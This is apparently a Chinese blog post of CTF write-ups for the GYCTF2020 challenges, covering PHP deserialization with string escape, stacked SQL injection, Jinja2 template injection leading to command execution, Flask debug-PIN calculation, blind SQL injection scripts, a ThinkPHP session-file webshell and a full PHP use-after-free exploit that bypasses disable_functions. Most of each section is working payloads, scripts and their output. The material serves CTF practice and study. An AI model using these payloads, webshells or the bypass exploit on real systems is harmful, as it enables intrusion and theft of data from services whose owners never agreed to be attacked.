+++
title = "GYCTF2020"
slug = "gyctf2020"
description = "刷"
date = "2024-08-18T13:01:34"
lastmod = "2024-08-18T13:01:34"
image = ""
license = ""
categories = ["复现"]
tags = ["php", "mysql", "nodejs"]
+++

# [GYCTF2020]Easyphp

看初始页面像是一个审计的题目，那么直接盲猜是`www.zip`有源码

伪造`admin`

`index.php`

```php
<?php
require_once "lib.php";

if(isset($_GET['action'])){
	require_once(__DIR__."/".$_GET['action'].".php");
}
else{
	if($_SESSION['login']==1){
		echo "<script>window.location.href='./index.php?action=update'</script>";
	}
	else{
		echo "<script>window.location.href='./index.php?action=login'</script>";
	}
}
?>
```

`login.php`一个防止sql注入的页面

```php
<?php 
$user=new user();
if(isset($_POST['username'])){
	if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['username'])){
		die("<br>Damn you, hacker!");
	}
	if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['password'])){
		die("Damn you, hacker!");
	}
	$user->login();
}
?>
```

`update.php`

```php
<?php
require_once('lib.php');
echo '<html>
<meta charset="utf-8">
<title>update</title>
<h2>这是一个未完成的页面，上线时建议删除本页面</h2>
</html>';
if ($_SESSION['login']!=1){
	echo "你还没有登陆呢！";
}
$users=new User();
$users->update();
if($_SESSION['login']===1){
	require_once("flag.php");
	echo $flag;
}

?>
```

`lib.php`

```php
<?php
error_reporting(0);
session_start();
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
        $mysqli=new dbCtrl();
        $this->id=$mysqli->login('select id,password from user where username=?');
        if($this->id){
        $_SESSION['id']=$this->id;
        $_SESSION['login']=1;
        echo "你的ID是".$_SESSION['id'];
        echo "你好！".$_SESSION['token'];
        echo "<script>window.location.href='./update.php'</script>";
        return $this->id;
        }
    }
}
    public function update(){
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));
    }
    public function __destruct(){
        return file_get_contents($this->nickname);//危
    }
    public function __toString()
    {
        $this->nickname->update($this->age);
        return "0-0";
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }
}
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this->sql;
    }
}
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this->name=$_POST['username'];
        $this->password=$_POST['password'];
        $this->token=$_SESSION['token'];
    }
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);   //绑定变量
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {   //是否等于Hash值
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
    public function update($sql)
    {
        //还没来得及写
    }
}
```

```sql
select 1,2;
_ _ _ _ _ _ _ _
|id	|password |
|1	|2        |
```

我们参数是可控的，这个时候找链子

```
__destruct()->__toString()->__call()->login()
```

EXP:

```php
<?php
class User{
    public $age=null;
    public $nickname=null;
    public function __construct(){
        $this->age='select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';
        $this->nickname=new Info(); //__toString
    }
}
class Info{
    public $CtrlCase;
    public function __construct(){
        $this->CtrlCase=new dbCtrl(); //__call
    }
}
class UpdateHelper{
    public $sql;
    public function __construct(){
        $this->sql=new User();
    }
}

class dbCtrl{
    public $name='admin';
    public $password='1';
}
echo serialize(new UpdateHelper());
```

```php
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
```

还需要字符逃逸,并且需要再次进行对象的序列化

```php
public function getNewInfo(){
    $age=$_POST['age'];
    $nickname=$_POST['nickname'];
    return safe(serialize(new Info($age,$nickname)));
}
```

如果传参

```
age=1&nickname=1

O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:1:"1";s:8:"CtrlCase";N;}
```

那我们`nickname`可控就可以逃逸了

```python
print(len('";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}};}'))
#264
```

那么就是52个`*`和两个`load`

```python
print("*"*52+'''load'''*2)
```

```
http://e4e592ee-9e7b-4d16-84f7-f7ab60db163e.node5.buuoj.cn:81/update.php

POST:
age=1&nickname=****************************************************loadloadload";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}};}

回显
你还没有登陆呢！10-0
```

然后再回去登录即可

# [GYCTF2020]Blacklist

堆叠注入（Stacked injections）。其原理就是将原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的sql语句了，这个时候使用增删改查毫无限制。

```
1' or 1=1;#

array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}

array(2) {
  [0]=>
  string(6) "114514"
  [1]=>
  string(2) "ys"
}
```

也就是说万能密码是可以的，那么尝试注入

```sql
1' union select 1,2,3#

return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

普通注入不行了，尝试堆叠注入

```sql
1';show database();#
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
```

再查表

```sql
1;show tables;#
啥都没有，一看没闭合，但是为什么爆库又可以呢
1';show tables;#

array(1) {
  [0]=>
  string(8) "FlagHere"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

后面怎么爆列、爆内容呢，一般这个列是不用担心的因为基本这种就是`flag`

但是依然可以操作

```sql
1';show columns from FlagHere;#

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

这里有个关键词相当美丽

**HANDLER**

> 例如，**HANDLER tbl_name OPEN**打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
>
> 通过**HANDLER tbl_name READ FIRST**获取句柄的第一行，通过**READ NEXT**依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
>
> 通过**HANDLER tbl_name CLOSE**来关闭打开的句柄。

```sql
1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;
```

读取第二行

```sql
1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere READ NEXT;HANDLER FlagHere CLOSE;
```

读取第三行

```sql
1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere READ NEXT;HANDLER FlagHere READ NEXT;HANDLER FlagHere CLOSE;
```

# [GYCTF2020]FlaskApp

## 绕过

一看就是一个`SSTI`

测试一下

测了一会由于之前一般测试都是用的`*`，然后发现这次一直在解密解密`nonono`

后面换了payload测试成功

```
{{4+4}}
加密为
e3s0KzR9fQ==
```

绕过好像有点多，用这个姿势去打算了比较万能

```python
{%for c in x.__class__.__base__.__subclasses__() %}{%if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{%endif %}{%endfor %}
加密为
eyVmb3IgYyBpbiB4Ll9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpICV9eyVpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKX19eyVlbmRpZiAlfXslZW5kZm9yICV9
```

搞到源码进行`html`解码得到

```python
from flask import Flask,render_template_string 
from flask import render_template,request,flash,redirect,url_for 
from flask_wtf import FlaskForm 
from wtforms import StringField, SubmitField 
from wtforms.validators import DataRequired 
from flask_bootstrap import Bootstrap 
import base64 

app = Flask(__name__) 
app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y' 
bootstrap = Bootstrap(app) 

class NameForm(FlaskForm): 
    text = StringField('BASE64 Æ',validators= [DataRequired()]) 
    submit = SubmitField('Ð¤') 
    class NameForm1(FlaskForm): 
        text = StringField('BASE64ãÆ',validators= [DataRequired()]) 
        submit = SubmitField('Ð¤') 

        def waf(str): 
            black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"] 
        
        for x in black_list : 
            if x in str.lower() : 
                return 1 
            @app.route('/hint',methods=['GET']) 
            def hint(): 
                txt = "1%CKÍ" 
                return render_template("hint.html",txt = txt) 
            @app.route('/',methods=['POST','GET']) 
            def encode(): 
                if request.values.get('text') : 
                    text = request.values.get("text") 
                    text_decode = base64.b64encode(text.encode()) 
                    tmp = "Ó :{0}".format(str(text_decode.decode())) 
                    res = render_template_string(tmp) 
                    flash(tmp) 
                    return redirect(url_for('encode')) 
                else : text = "" 
                form = NameForm(text) 
                return render_template("index.html",form = form ,method = " Æ" ,img = "flask.png")
             
            @app.route('/decode',methods=['POST','GET']) 
            def decode(): 
                if request.values.get('text') : 
                    text = request.values.get("text") 
                    text_decode = base64.b64decode(text.encode()) 
                    tmp = "Ó  {0}".format(text_decode.decode()) 
                    if waf(tmp) : 
                        flash("no no no !!") 
                        return redirect(url_for('decode')) 
                    res = render_template_string(tmp) 
                    flash( res ) 
                    return redirect(url_for('decode')) 
                else : 
                    text = "" 
                    form = NameForm1(text) 
                    return render_template("index.html",form = form, method = "ãÆ" , img = "flask1.png") 
                
            @app.route('/<name>',methods=['GET']) 
            def not_found(name): 
                return render_template("404.html",name = name) 
            if __name__ == '__main__': 
                app.run(host="0.0.0.0", port=5000, debug=True)
```

拿到过滤名单之后我们就知道怎么RCE了

本地调试了一会终于成功了

```python
{% for c in x.__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s')['po'+'pen']('ls /').read()}}{% endif %}{% endfor %}

eyUgZm9yIGMgaW4geC5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKSAlfXslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX17eyBjLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXVsnX19pbXAnKydvcnRfXyddKCdvJysncycpWydwbycrJ3BlbiddKCdscyAvJykucmVhZCgpfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ==
```

```python
{% for c in x.__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s')['po'+'pen']('tac /this_is_the_fl'+'ag.txt').read()}}{% endif %}{% endfor %}
```

其实还可以直接列表列出来然后读取文件

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```

## pin值

```
{%for c in x.__class__.__base__.__subclasses__() %}{%if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif %}{%endfor %}
加密打入
得到flaskweb
```

```
flask.app

Flask

{%for c in x.__class__.__base__.__subclasses__() %}{%if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif %}{%endfor %}
直接打入得到
/usr/local/lib/python3.7/site-packages/flask/app.py
```

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read()}}{% endif %}{% endfor %}
加密打入得到
92:8a:43:bb:5b:c3
```

```
首先访问`/etc/machine-id`，有值就break，没值就访问`/proc/sys/kernel/random/boot_id`，然后不管此时有没有值，再访问`/proc/self/cgroup` 或 `/proc/self/mountinfo` 或 `/proc/self/cpuset` 其中的值拼接到前面的值后面。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/machine-id','r').read()}}{% endif %}{% endfor %}
加密打入
1408f836b0ca514d796cbf8960e45fa1

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read()}}{% endif %}{% endfor %}
加密打入
0::/


python "c:\Users\baozhongqi\Documents\VSCODE\.vscode\python\index.py" -u flaskweb -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 92:8a:43:bb:5b:c3 -i 1408f836b0ca514d796cbf8960e45fa1
Md5Pin:  462-301-547
Sha1Pin:  468-724-479
```

这里是`python3.7`所以使用`md5`

终于打通了 

```
>>> import os
>>> os.popen('ls /')
<os._wrap_close object at 0x7fad121fa910>
>>> os.popen('ls /').read()
'app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nro  
>>> print(os.popen('ls /').read())
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
this_is_the_flag.txt
tmp
usr
var

>>> print(os.popen('tac /f*').read())

>>> print(os.popen('tac /this_is_the_flag.txt').read())
flag{c5d06b53-5aae-44b5-b805-246affc80c5f}
```

# [GYCTF2020]Ezsqli

一眼`sql`注入

```
1&&1=1
Nu1L

1&&1=0
Error Occured When Fetch Result.

1&&length(database())>20
1&&length(database())>21
测出数据库长度为21,那么就是一个盲注
```

但是过滤的东西还是比较多的，比如查表的时候

只能用`sys.x$schema_flattened_keys`,`information`被过滤，`mysql.innodb`也无法使用，只能用这个新搜到的
写法和这两个是一样的直接写就行

查列名的话使用无列名注入，但是`union`被过滤了

所以可以直接猜`flag`是列名来打通

```python
import requests

url = "http://ddf1fa73-7ed4-44b8-a6ca-523a8eca6212.node5.buuoj.cn:81/index.php"
flag = ""
i = 0

while True:
    i += 1
    low = 32
    high = 127

    while low < high:
        mid = (low + high) // 2

        # payload = f"1&&(ascii(substr((database()),{i},1))>{mid})"
        # payload = f"1&&(ascii(substr((select(group_concat(table_name))from(sys.x$schema_flattened_keys)where(table_schema=database())),{i},1))>{mid})"
        # f1ag_1s_h3r3_hhhhh, users233333333333333
        payload = f"1&&(ascii(substr((select(group_concat(flag))from(f1ag_1s_h3r3_hhhhh)),{i},1))>{mid})"
        
        data = {
            'id': {payload}
        }
        r = requests.post(url=url, data=data)

        if "Nu1L" in r.text:
            low = mid + 1
        else:
            high = mid

    if low != 32:
        flag += chr(low)
    else:
        break

    print(flag)
```

这里还有姿势可以打出列名，就是`ascii`无列名偏移注入

我多次调试,这个脚本大家可以放心食用

```python
import time
import requests

url = "http://ddf1fa73-7ed4-44b8-a6ca-523a8eca6212.node5.buuoj.cn:81/index.php"
flag = ""
i = 0

while i < 44:
    i += 1
    low = 32
    high = 127

    while low < high:
        s = flag  # 动态更新flag，一个一个摸索值
        mid = (low + high) // 2
        s += chr(mid)
        
        payload = f"1&&((select * from f1ag_1s_h3r3_hhhhh)>(select 1,'{s}'))"
        # payload = f"1^((select * from f1ag_1s_h3r3_hhhhh)>(select 1,'{s}'))<^1"
        # payload = f"0^((select * from f1ag_1s_h3r3_hhhhh)>(select 1,'{s}'))"
        # print(payload)

        data = {
            'id': {payload}
        }

        time.sleep(0.025)
        r = requests.post(url=url, data=data)

        if "Nu1L" in r.text:
            low = mid + 1
        else:
            high = mid

    if low != 32 and chr(low-1) !='~' and chr(low-1) != 'x':
        flag += chr(low - 1)  # 实际字符减1才是我们需要的字符
    elif chr(low-1) == 'x':
        break
    elif chr(low-1) =='~':
        break

    print("\r" + flag.lower(), end='')  # 动态输出flag在同一行


print("}")
print("flag已经可以了")  # 打印一个换行，使得下一行内容不再覆盖在flag上面
```

# [GYCTF2020]EasyThinking

`tp6`的任意文件读取漏洞

`/www.zip`有源码泄露

利用32位的`session`可控来上传shell

```php
Request:

POST /home/member/login HTTP/1.1
Host: a7a25127-aeba-4bf7-90d1-52c4af263b76.node5.buuoj.cn:81
Content-Length: 21
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://a7a25127-aeba-4bf7-90d1-52c4af263b76.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://a7a25127-aeba-4bf7-90d1-52c4af263b76.node5.buuoj.cn:81/home/member/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=1111111111111111111111111111.php
Connection: close

username=6&password=6
```

```
response:

HTTP/1.1 302 Found
Server: openresty
Date: Mon, 19 Aug 2024 09:56:29 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.11
Cache-control: no-cache,must-revalidate
Location: /home/member/index
Set-Cookie: PHPSESSID=1111111111111111111111111111.php; path=/
Cache-Control: no-cache
Content-Length: 0
```

在搜索页面打入`<?php phpinfo()?>`看看成功没有

访问`/runtime/session/sess_1111111111111111111111111111.php`

成功了

再打入一句话`<?php @eval($_POST[1]);?>`

链接`antsword`

```
url:http://a7a25127-aeba-4bf7-90d1-52c4af263b76.node5.buuoj.cn:81/runtime/session/sess_1111111111111111111111111111.php

password:1
```

然后发现权限不够不能运行文件

临时文件目录`/tmp`中每个用户都有权限写入文件

这里我们写入一个`php<7.4`的`bypass`的`shell`

```php
<?php

pwn("/readflag"); //这里是想要执行的系统命令

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}
```

然后包含即可

```
http://82b25714-2b60-4588-bf7a-fc55e17d3f33.node5.buuoj.cn:81/runtime/session/sess_1111111111111111111111111111.php

POST:
1=include("/tmp/poc.php");
```

# [GYCTF2020]Ez_Express

`express`的`SSTI`或者污染

# [GYCTF2020]Node Game

原型链污染，但是我这的污染水平这两道题都做不了

# [GYCTF2020]NewsWebsite

不懂欠着
